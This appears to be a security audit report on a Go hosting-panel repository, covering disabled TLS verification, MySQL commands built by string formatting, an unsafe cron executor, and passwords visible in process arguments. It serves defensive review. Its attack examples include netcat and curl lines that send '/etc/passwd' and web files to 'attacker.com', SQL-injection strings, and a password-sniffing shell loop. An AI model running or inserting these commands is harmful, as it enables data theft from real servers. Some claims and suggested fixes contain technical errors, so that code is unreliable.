# MAH Repository - Detailed Security Findings

## Quick Reference Table

| Finding | File | Lines | Severity | CWE | CVSS |
|---------|------|-------|----------|-----|------|
| TLS InsecureSkipVerify - Proxmox | `internal/cloud/providers/proxmox/proxmox.go` | 63-65 | CRITICAL | CWE-295 | 7.5 |
| MySQL Command Injection Risk | `internal/agent/provisioner.go` | 467, 475-477, 496, 502 | CRITICAL | CWE-78 | 8.1 |
| Unsafe Cron Executor | `internal/cron/executor.go` | 50-60 | HIGH | CWE-78 | 6.5 |
| TLS Skip in Agent | `internal/agent/connection.go` | 69-71 | HIGH | CWE-295 | 6.5 |
| Password Exposure in Args | `internal/agent/provisioner.go` | 475-477 | HIGH | CWE-798 | 6.3 |
| Debug Handler TLS | `internal/panel/ssl/debug_handler.go` | 209 | MEDIUM | CWE-295 | 5.3 |
| Path Traversal Validation | `internal/provisioning/providers/local/permissions.go` | 34-36 | MEDIUM | CWE-22 | 5.1 |

---

## Finding 1: Proxmox TLS Certificate Verification Disabled

### Details
**File:** `C:/Users/Admin/Documents/VS Projects/MAH/internal/cloud/providers/proxmox/proxmox.go`
**Lines:** 63-65
**Component:** Cloud Infrastructure - Proxmox VE Provider
**Severity:** CRITICAL (CVSS 7.5 - High)

### Code Context
```go
// NewProvider creates a new Proxmox provider instance.
func NewProvider(config providers.ProviderConfig) (*Provider, error) {
    // ... validation code ...
    client := &Client{
        baseURL:  strings.TrimSuffix(config.ProxmoxURL, "/"),
        username: config.ProxmoxUser,
        password: config.ProxmoxPassword,  // EXPOSED
        httpClient: &http.Client{
            Timeout: 30 * time.Second,
            Transport: &http.Transport{
                TLSClientConfig: &tls.Config{
                    InsecureSkipVerify: true,  // VULNERABILITY
                },
            },
        },
    }

    if err := client.authenticate(); err != nil {
        return nil, fmt.Errorf("authentication failed: %w", err)
    }

    return &Provider{
        client: client,
        node:   config.ProxmoxNode,
    }, nil
}
```

### Attack Scenario
1. Attacker performs ARP spoofing or DNS hijacking on network
2. Traffic to Proxmox server is intercepted
3. Fake HTTPS certificate is presented (not verified)
4. Credentials transmitted to attacker instead of Proxmox
5. Attacker gains full infrastructure control

### Affected Operations
- All HTTPS API calls to Proxmox
- VM creation/deletion
- Resource allocation
- Network configuration
- Storage management

### Recommended Actions
1. **Immediate:** Add certificate validation with custom CAs
2. **Deployment:** Require valid certificates in production
3. **Testing:** Use proper test environments with valid certs
4. **Monitoring:** Log all certificate validation failures

### Proof of Concept Fix
```go
// Option 1: Use system CA bundle
httpClient := &http.Client{
    Timeout: 30 * time.Second,
    Transport: &http.Transport{
        TLSClientConfig: &tls.Config{
            InsecureSkipVerify: false,  // REQUIRED
        },
    },
}

// Option 2: Use custom CA certificate
caCertData := os.Getenv("PROXMOX_CA_CERT")
if caCertData == "" {
    return nil, fmt.Errorf("PROXMOX_CA_CERT environment variable required")
}
caCertPool := x509.NewCertPool()
if !caCertPool.AppendCertsFromPEM([]byte(caCertData)) {
    return nil, fmt.Errorf("failed to parse CA certificate")
}
httpClient := &http.Client{
    Timeout: 30 * time.Second,
    Transport: &http.Transport{
        TLSClientConfig: &tls.Config{
            RootCAs: caCertPool,
        },
    },
}
```

---

## Finding 2: SQL Injection Risk in MySQL Database Operations

### Details
**File:** `C:/Users/Admin/Documents/VS Projects/MAH/internal/agent/provisioner.go`
**Lines:** 467, 475-477, 496, 502
**Component:** Account Provisioning - Database Creation
**Severity:** CRITICAL (CVSS 8.1)

### Vulnerable Code Sections

#### Section 1: Database Creation (Line 467)
```go
createDBCmd := exec.CommandContext(ctx, "mysql", "-e", fmt.Sprintf("CREATE DATABASE IF NOT EXISTS `%s`;", dbName))
if output, err := createDBCmd.CombinedOutput(); err != nil {
    return fmt.Errorf("create database failed: %w, output: %s", err, string(output))
}
```

#### Section 2: User Creation with Password (Lines 475-477)
```go
escapedPassword := strings.ReplaceAll(dbPassword, "'", "''") // MySQL escape single quotes
grantCmd := exec.CommandContext(ctx, "mysql", "-e", fmt.Sprintf(
    "CREATE USER IF NOT EXISTS '%s'@'localhost' IDENTIFIED BY '%s'; GRANT ALL PRIVILEGES ON `%s`.* TO '%s'@'localhost'; FLUSH PRIVILEGES;",
    dbUser, escapedPassword, dbName, dbUser))
if output, err := grantCmd.CombinedOutput(); err != nil {
    return fmt.Errorf("grant privileges failed: %w, output: %s", err, string(output))
}
```

#### Section 3: Database Deletion (Line 496)
```go
dropDBCmd := exec.CommandContext(ctx, "mysql", "-e", fmt.Sprintf("DROP DATABASE IF EXISTS `%s`;", dbName))
```

#### Section 4: User Deletion (Line 502)
```go
dropUserCmd := exec.CommandContext(ctx, "mysql", "-e", fmt.Sprintf("DROP USER IF EXISTS '%s'@'localhost';", dbUser))
```

### Validation Inadequacy

The code validates inputs with regex patterns:
```go
// Lines 56-59: Database name validation
func validateDBName(name string) error {
    if len(name) > 64 {
        return fmt.Errorf("database name too long: max 64 characters")
    }
    if !regexp.MustCompile(`^[a-zA-Z0-9_]+$`).MatchString(name) {
        return fmt.Errorf("invalid database name: only alphanumeric and underscore allowed")
    }
    return nil
}
```

### Bypass Scenarios

**Scenario 1: Comment Injection (if validation weakened)**
```
dbName = "test; DROP TABLE users; --"
// Even with current regex, future changes could allow this
```

**Scenario 2: Quote Escape Bypass**
```
password = "'; DROP USER 'admin'@'localhost'; --"
// While single quotes are escaped to '', there could be encoding bypasses
```

**Scenario 3: Username with Special Characters**
```
dbUser = "user`admin"
// Backticks could cause issues if validation changes
```

### Why This Is Dangerous

1. **Shell Execution Risk:** Commands are executed through shell, not database drivers
2. **Credential Visibility:** Passwords visible in process arguments (`ps aux`)
3. **No Prepared Statements:** Direct string concatenation instead of parameterized queries
4. **Limited Escaping:** Only single quotes escaped, other characters could cause issues
5. **Future Maintenance Risk:** Code comments suggest intent may change

### Recommended Fix

```go
// Use MySQL driver with proper connection handling
import (
    "database/sql"
    _ "github.com/go-sql-driver/mysql"
)

func (p *Provisioner) createDatabaseProper(ctx context.Context, dbName, dbUser, dbPassword string) error {
    // Validate inputs
    if err := validateDBName(dbName); err != nil {
        return fmt.Errorf("invalid database name: %w", err)
    }
    if err := validateUsername(dbUser); err != nil {
        return fmt.Errorf("invalid database user: %w", err)
    }
    if err := validatePassword(dbPassword); err != nil {
        return fmt.Errorf("invalid password: %w", err)
    }

    // Connect to MySQL (without target database for initial operations)
    dsn := fmt.Sprintf("root:@tcp(localhost:3306)/?parseTime=true")
    db, err := sql.Open("mysql", dsn)
    if err != nil {
        return fmt.Errorf("failed to connect to MySQL: %w", err)
    }
    defer db.Close()

    // Create database - backticks protect identifier
    if _, err := db.ExecContext(ctx, "CREATE DATABASE IF NOT EXISTS `"+dbName+"`"); err != nil {
        return fmt.Errorf("create database failed: %w", err)
    }

    // Create user with prepared statement
    createUserSQL := "CREATE USER IF NOT EXISTS ? @'localhost' IDENTIFIED BY ?"
    if _, err := db.ExecContext(ctx, createUserSQL, dbUser, dbPassword); err != nil {
        return fmt.Errorf("create user failed: %w", err)
    }

    // Grant privileges with prepared statement
    grantSQL := "GRANT ALL PRIVILEGES ON `" + dbName + "`.* TO ?@'localhost'"
    if _, err := db.ExecContext(ctx, grantSQL, dbUser); err != nil {
        return fmt.Errorf("grant privileges failed: %w", err)
    }

    if _, err := db.ExecContext(ctx, "FLUSH PRIVILEGES"); err != nil {
        return fmt.Errorf("flush privileges failed: %w", err)
    }

    return nil
}
```

---

## Finding 3: Unsafe Cron Command Executor

### Details
**File:** `C:/Users/Admin/Documents/VS Projects/MAH/internal/cron/executor.go`
**Lines:** 50-60, 119-120
**Component:** Cron Job Execution Engine
**Severity:** HIGH (CVSS 6.5)

### Vulnerable Code
```go
// Line 50-60: Unsafe executor with no restrictions
func NewExecutorUnsafe(timeout time.Duration) *Executor {
    if timeout == 0 {
        timeout = 5 * time.Minute
    }
    return &Executor{
        timeout:         timeout,
        allowedCommands: make(map[string]bool),
        allowAllCommands: true,  // DANGEROUS: ALL COMMANDS ALLOWED
    }
}

// Line 119-120: Validation completely bypassed
func (e *Executor) ValidateCommand(command string) error {
    if e.allowAllCommands {
        return nil // Unsafe mode - allow everything  ← VULNERABILITY
    }
    // ... rest of validation ...
}
```

### Attack Vectors

**Vector 1: Command Injection via Cron Job Creation**
```bash
# Attacker creates cron job:
curl -X POST /api/cron/create \
  -d '{"command": "ls; nc attacker.com 4444 < /etc/passwd", ...}'

# With unsafe mode enabled:
# Command executes: ls; nc attacker.com 4444 < /etc/passwd
# Result: passwd file exfiltrated
```

**Vector 2: Data Exfiltration**
```bash
# Malicious cron command:
"tar czf - /var/www | curl -d @- http://attacker.com/upload"
```

**Vector 3: Privilege Escalation**
```bash
# Cron runs as www-data, but could execute:
"sudo /usr/bin/something_dangerous"
```

### Why Safe Mode Exists But Isn't Used

Looking at the code, the safe mode validators check for dangerous patterns:
```go
dangerousPatterns := []string{
    ";", "&&", "||", "|", "`", "$(", "${", ">", "<", "&",
}
```

But the unsafe mode completely bypasses this, creating a false sense of security.

### Root Cause Analysis

The `NewExecutorUnsafe()` function appears to be created for testing or development but:
1. No environment guard prevents production use
2. No logging indicates when unsafe mode is active
3. No rate limiting or auditing of executed commands
4. No warning in documentation about production risks

### Recommended Fixes

**Fix 1: Environment Guard**
```go
func NewExecutorUnsafe(timeout time.Duration) (*Executor, error) {
    // Only allow in development
    if os.Getenv("ENVIRONMENT") == "production" {
        return nil, fmt.Errorf("unsafe executor not permitted in production")
    }
    if os.Getenv("UNSAFE_CRON_ENABLED") != "true" {
        return nil, fmt.Errorf("unsafe cron execution not enabled")
    }
    log.Printf("[WARNING] Using UNSAFE cron executor - use only for testing!")
    // ... rest of function
}
```

**Fix 2: Comprehensive Logging**
```go
// Log every command executed in safe mode
func (e *Executor) Execute(ctx context.Context, command string, env map[string]string) (*ExecutionResult, error) {
    audit.Log(audit.Event{
        EventType: "cron_execute",
        Command:   command,
        Timestamp: time.Now(),
        User:      "system",
    })
    // ... execution code ...
}
```

**Fix 3: Runtime Constraints**
```go
// Limit what can run even in safe mode
const (
    MaxCommandLength = 1000
    MaxArgs          = 20
)

func (e *Executor) ValidateCommand(command string) error {
    if len(command) > MaxCommandLength {
        return fmt.Errorf("command too long")
    }
    // ... more validation ...
}
```

---

## Finding 4: TLS Verification Disabled in Agent Connection

### Details
**File:** `C:/Users/Admin/Documents/VS Projects/MAH/internal/agent/connection.go`
**Lines:** 69-71
**Component:** Agent WebSocket Connection
**Severity:** HIGH (CVSS 6.5)

### Code Analysis
```go
dialer := websocket.DefaultDialer
if c.config.TLSSkipVerify {
    dialer.TLSClientConfig.InsecureSkipVerify = true
}

log.Printf("[AGENT] Connecting to %s", serverURL.String())
conn, _, err := dialer.Dial(serverURL.String(), headers)
```

### Associated Configuration
From `internal/agent/types.go`:
```go
type Config struct {
    TLSSkipVerify bool  // Allows connecting without verifying certificates
    // ... other fields ...
}
```

### Configuration Loading
From `internal/agent/config_security.go` (lines 47-51):
```go
// Ensure server URL uses secure protocol unless explicitly allowed
if !strings.HasPrefix(c.ServerURL, "wss://") && !strings.HasPrefix(c.ServerURL, "https://") {
    if !c.TLSEnabled && !c.TLSSkipVerify {
        log.Printf("[WARNING] Server URL %s is not using secure protocol", c.ServerURL)
    }
}
```

### Security Issues

1. **No Production Guard:** Any config can set `TLSSkipVerify: true`
2. **MITM Vulnerability:** Agent communications with server can be intercepted
3. **Credential Exposure:** Agent credentials (X-Agent-ID, X-API-Key) sent unverified
4. **Command Injection:** Server could send arbitrary commands with no verification

### Configuration Attack

```bash
# Environment variable could be set by container orchestration:
export AGENT_TLS_SKIP_VERIFY=true

# Or in configuration file:
{
  "server_url": "wss://attacker.com:8443",
  "api_key": "real_api_key",
  "tls_skip_verify": true
}

# Result: Agent connects to attacker's server instead of legitimate server
```

### Recommended Fixes

```go
// Fix 1: Strict production enforcement
func (c *Connection) Connect() error {
    c.mu.Lock()
    defer c.mu.Unlock()

    // In production, require certificate verification
    if os.Getenv("ENVIRONMENT") == "production" {
        if c.config.TLSSkipVerify {
            return fmt.Errorf("TLSSkipVerify not allowed in production environment")
        }
    }

    serverURL, err := url.Parse(c.config.ServerURL)
    if err != nil {
        return fmt.Errorf("invalid server URL: %w", err)
    }

    // Log certificate verification status
    log.Printf("[SECURITY] TLS verification: %v", !c.config.TLSSkipVerify)

    dialer := websocket.DefaultDialer
    if c.config.TLSSkipVerify {
        log.Printf("[WARNING] Connecting without TLS verification - SECURITY RISK")
        dialer.TLSClientConfig = &tls.Config{
            InsecureSkipVerify: true,
        }
    }

    conn, _, err := dialer.Dial(serverURL.String(), c.makeHeaders())
    // ... rest of function ...
}

// Fix 2: Validate certificate chain manually when skipping
func (c *Connection) validateCertificateManually(serverURL *url.URL) error {
    // Connect and get certificate, then validate
    conn, err := tls.Dial("tcp", serverURL.Host+":"+serverURL.Port(), &tls.Config{
        InsecureSkipVerify: true,
    })
    if err != nil {
        return fmt.Errorf("certificate fetch failed: %w", err)
    }
    defer conn.Close()

    cert := conn.ConnectionState().PeerCertificates[0]
    // Verify certificate against known good thumbprint
    actualThumbprint := sha256.Sum256(cert.Raw)
    expectedThumbprint := os.Getenv("AGENT_CERT_THUMBPRINT")
    // ... validation logic ...
}
```

---

## Finding 5: Password Exposure in Command-Line Arguments

### Details
**File:** `C:/Users/Admin/Documents/VS Projects/MAH/internal/agent/provisioner.go`
**Lines:** 475-477
**Component:** Database User Provisioning
**Severity:** HIGH (CVSS 6.3)

### Vulnerability Details

```go
escapedPassword := strings.ReplaceAll(dbPassword, "'", "''")
grantCmd := exec.CommandContext(ctx, "mysql", "-e", fmt.Sprintf(
    "CREATE USER IF NOT EXISTS '%s'@'localhost' IDENTIFIED BY '%s'; ...",
    dbUser, escapedPassword, dbName, dbUser))
if output, err := grantCmd.CombinedOutput(); err != nil {
    return fmt.Errorf("grant privileges failed: %w, output: %s", err, string(output))
}
```

### Why This Is Dangerous

**Exposure Vector 1: Process List**
```bash
# Attacker runs:
$ ps aux | grep mysql
root 12345 0.0 0.1 mysql -e "CREATE USER 'webuser'@'localhost' IDENTIFIED BY 'MySecurePassword123!'"
                                                                                    ^^^^^^^^^^^^^^^^^^^
```

**Exposure Vector 2: Process Memory**
```bash
# Attacker reads /proc/[pid]/cmdline
$ cat /proc/12345/cmdline
mysql-eCreateUSERIF...MySecurePassword123!...
```

**Exposure Vector 3: History Files**
```bash
# If bash history not cleared:
$ cat ~/.bash_history
mysql -e "CREATE USER 'webuser'@'localhost' IDENTIFIED BY 'MySecurePassword123!'"
```

**Exposure Vector 4: Container Logs**
```
# Docker logs capture all output including command args
docker logs container_id
```

### Affected Platforms

- All Linux/Unix systems (process visibility)
- Container orchestration (Docker, Kubernetes)
- Cloud platforms with process monitoring
- Debugging/APM tools

### Proof of Concept

```bash
#!/bin/bash
# Attacker script - runs continuously
while true; do
    ps aux | grep -i "identified by" | grep -v grep
    sleep 1
done
```

Result: Every database creation would expose the password to this script.

### Recommended Fix

**Option 1: Use stdin (Secure)**
```go
func (p *Provisioner) createDatabaseSecure(ctx context.Context, dbName, dbUser, dbPassword string) error {
    // Build MySQL commands to execute via stdin
    cmd := exec.CommandContext(ctx, "mysql", "-u", "root")

    sqlCommands := fmt.Sprintf(
        "CREATE DATABASE IF NOT EXISTS `%s`;\n" +
        "CREATE USER IF NOT EXISTS '%s'@'localhost' IDENTIFIED BY %s;\n" +
        "GRANT ALL PRIVILEGES ON `%s`.* TO '%s'@'localhost';\n" +
        "FLUSH PRIVILEGES;\n",
        escapeDatabaseName(dbName),
        escapeMySQLIdentifier(dbUser),
        escapeMySQLString(dbPassword),  // Use proper escaping
        escapeDatabaseName(dbName),
        escapeMySQLIdentifier(dbUser),
    )

    cmd.Stdin = strings.NewReader(sqlCommands)

    output, err := cmd.CombinedOutput()
    // Password never appears in command arguments
    return err
}

// Helper functions
func escapeMySQLString(s string) string {
    return "'" + strings.ReplaceAll(s, "'", "''") + "'"
}

func escapeMySQLIdentifier(s string) string {
    return "`" + strings.ReplaceAll(s, "`", "``") + "`"
}

func escapeDatabaseName(s string) string {
    return "`" + strings.ReplaceAll(s, "`", "``") + "`"
}
```

**Option 2: Use MySQL Driver (Most Secure)**
```go
import (
    "database/sql"
    _ "github.com/go-sql-driver/mysql"
)

func (p *Provisioner) createDatabaseDriver(ctx context.Context, dbName, dbUser, dbPassword string) error {
    // Connect with admin credentials (from environment or secure store)
    adminDSN := os.Getenv("MYSQL_ADMIN_DSN")
    if adminDSN == "" {
        return fmt.Errorf("MYSQL_ADMIN_DSN not set")
    }

    db, err := sql.Open("mysql", adminDSN)
    if err != nil {
        return fmt.Errorf("database connection failed: %w", err)
    }
    defer db.Close()

    // All commands use prepared statements - passwords never in SQL
    statements := []struct {
        query string
        args  []interface{}
    }{
        {
            query: "CREATE DATABASE IF NOT EXISTS ??",
            args:  []interface{}{dbName},
        },
        {
            query: "CREATE USER IF NOT EXISTS ?@'localhost' IDENTIFIED BY ?",
            args:  []interface{}{dbUser, dbPassword},
        },
        {
            query: "GRANT ALL PRIVILEGES ON ??.* TO ?@'localhost'",
            args:  []interface{}{dbName, dbUser},
        },
        {
            query: "FLUSH PRIVILEGES",
            args:  []interface{}{},
        },
    }

    for _, stmt := range statements {
        if _, err := db.ExecContext(ctx, stmt.query, stmt.args...); err != nil {
            return fmt.Errorf("execution failed: %w", err)
        }
    }

    return nil
}
```

---

## Summary of Recommendations

### Immediate Actions (Within 24 hours)
1. Add `InsecureSkipVerify: false` requirement for Proxmox
2. Review Proxmox provider for any production deployments
3. Check for any logs containing passwords in MySQL operations
4. Audit cron executor usage patterns

### Short-term (Within 1 week)
1. Refactor MySQL operations to use database drivers
2. Remove or gate `NewExecutorUnsafe()` function
3. Implement certificate pinning for agent connections
4. Add comprehensive security logging

### Long-term (Within 1 month)
1. Implement secrets management (HashiCorp Vault, AWS Secrets Manager)
2. Add SAST tools to CI/CD pipeline
3. Conduct security testing and penetration testing
4. Implement runtime application security monitoring (RASM)

---

**Document Version:** 1.0
**Last Updated:** 2025-12-16
**Classification:** Security Sensitive
